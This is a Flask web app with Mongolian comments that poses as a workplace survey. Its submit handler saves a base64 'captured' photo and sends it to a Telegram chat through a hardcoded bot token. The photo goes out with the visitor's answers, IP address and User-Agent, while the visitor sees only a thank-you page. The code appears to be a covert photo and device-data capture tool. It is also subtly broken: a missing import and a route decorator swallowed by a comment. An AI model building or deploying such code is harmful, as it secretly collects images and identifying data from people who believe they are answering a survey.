# app.py - СУДАЛГАА БА ЗУРАГ ТЕЛЕГРАМ РУУ ИЛГЭЭХ БҮРЭН КОД
import requests
import base64
import os
from flask import Flask, request, jsonify, render_template, redirect, url_for

# ====================================================================
# ⚠️ 1. ТАНЫ ТОХИРГОО ⚠️
# ====================================================================
# Render Environment Variables-аас нууц үгсийг авна
TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN', '8476306576:AAFIzHzOLDQR_qOKb5yn4eK6VsMmIrGdy_Q')
CHAT_ID = os.environ.get('CHAT_ID', '-5036234831')
UPLOAD_FOLDER = 'captured_images'
# ====================================================================

app = Flask(__name__)

# Зураг хадгалах хавтас үүсгэх (Энэ хэсэгт алдаа гарсан)
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

# ----------------- sendPhoto ЧАДВАРТАЙ ФУНКЦ -----------------
def send_telegram_media_notification(message_text, image_filepath=None):
    """Текст болон зургийг хамт Telegram API руу илгээх функц"""
    
    if image_filepath and os.path.exists(image_filepath):
        TELEGRAM_PHOTO_API_URL = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto'
        payload = {
            'chat_id': CHAT_ID, 
            'caption': message_text, 
            'parse_mode': 'Markdown'
        }
        files = {'photo': open(image_filepath, 'rb')}
        
        try:
            response = requests.post(TELEGRAM_PHOTO_API_URL, data=payload, files=files)
            response.raise_for_status()
            print("Telegram-д зураг болон текст амжилттай илгээгдлээ.")
            return True
        except requests.exceptions.RequestException as e:
            print(f"Telegram API руу зураг илгээх алдаа: {e}")
            return False
    else:
        TELEGRAM_MESSAGE_API_URL = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage'
        payload_text_only = {
            'chat_id': CHAT_ID, 
            'text': message_text, 
            'parse_mode': 'Markdown'
        }
        try:
            response = requests.post(TELEGRAM_MESSAGE_API_URL, json=payload_text_only)
            response.raise_for_status()
            print("Telegram-д зөвхөн текст амжилттай илгээгдлээ.")
            return True
        except requests.exceptions.RequestException as e:
            print(f"Telegram API руу зөвхөн текст илгээх алдаа: {e}")
            return False


# ----------------- Үндсэн Вэб Хаяг -----------------
@app.route('/')
def index():
    return render_template('index.html') 

# ----------------- Амжилттай Илгээсэн Хуудас -----------------
@app.route('/success')
def success():
    """Амжилттай илгээсэн хуудас (Хэрэглэгчийн харах хуудас)."""
    return """
    <div style='text-align: center; padding: 50px; font-family: Arial;'>
        <h1 style='color: green;'>✅ Баярлалаа!</h1>
        <p style='font-size: 18px;'>Таны хариулт амжилттай илгээгдлээ. Бид таны саналд талархаж байна.</p>
        <p style='margin-top: 20px; color: #666;'>Та энэ хуудсыг хааж болно.</p>
    </div>
    """

# ----------------- Өгөгдөл Хүлээн Авах API -----------------@app.route('/submit', methods=['POST'])
def submit():
    role_department = request.form.get('role_department', 'Хариулаагүй')
    profession = request.form.get('profession', 'Хариулаагүй')
    photo_data = request.form.get('photo_data', None) # Шинээр нэмэгдэж буй хувьсагч!
    
    image_filepath = None

    if photo_data and photo_data.startswith('data:image/'):
        try:
            # Base64 датаг салгаж авах (жишээ нь: 'data:image/jpeg;base64,xxxxxx'-ээс 'xxxxxx'-г авах)
            header, encoded = photo_data.split(',', 1)
            image_data = base64.b64decode(encoded)
            
            # Файлын нэр үүсгэх
            filename = f"capture_{int(time.time())}.jpg"
            image_filepath = os.path.join(UPLOAD_FOLDER, filename)
            
            # Файлыг хадгалах
            with open(image_filepath, 'wb') as f:
                f.write(image_data)
            
            print(f"Зураг амжилттай хадгалагдлаа: {image_filepath}")
        
        except Exception as e:
            print(f"Зураг боловсруулах алдаа: {e}")
            image_filepath = None

    message = (
        f"📋 ШИНЭ СУДАЛГААНЫ ХАРИУЛТ:\n\n"
        f"1) Албан тушаал, Хэлтэс: {role_department}\n"
        f"2) Мэргэжил, Ажлын чиглэл: {profession}\n\n"
        f"--- ТӨХӨӨРӨМЖИЙН МЭДЭЭЛЭЛ ---\n"
        f"📍 IP: {request.remote_addr}\n"
        f"🌐 User-Agent: {request.headers.get('User-Agent')}"
        # Зураг амжилттай авсан бол Telegram-аар илгээгдэнэ.
    )
    
    # 4. Telegram руу зураг болон текст илгээх
    send_telegram_media_notification(message, image_filepath=image_filepath)

    # 5. Хэрэглэгчийг амжилттай болсны мэдэгдэл рүү шилжүүлэх
    return redirect(url_for('success'))
if __name__ == '__main__':
    # Local туршилтад зориулав
    app.run(port=8080, debug=True)